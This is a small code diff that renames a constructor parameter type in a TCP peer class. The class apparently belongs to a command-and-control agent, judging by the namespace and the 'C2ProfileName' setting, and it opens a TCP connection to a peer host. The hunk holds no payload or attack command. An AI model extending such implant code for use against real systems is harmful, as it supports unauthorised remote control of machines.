@@ -26,7 +26,7 @@ namespace Apollo.Peers.TCP
         private Action<object> _sendAction;
         private TTasks.Task _sendTask;
         private string _partialData = "";
-        public TCPPeer(IAgent agent, NewPeerInformation info) : base(agent, info)
+        public TCPPeer(IAgent agent, PeerInformation info) : base(agent, info)
         {
             C2ProfileName = "tcp";
             _tcpClient = new AsyncTcpClient(info.Hostname, info.C2Profile.Parameters.Port);
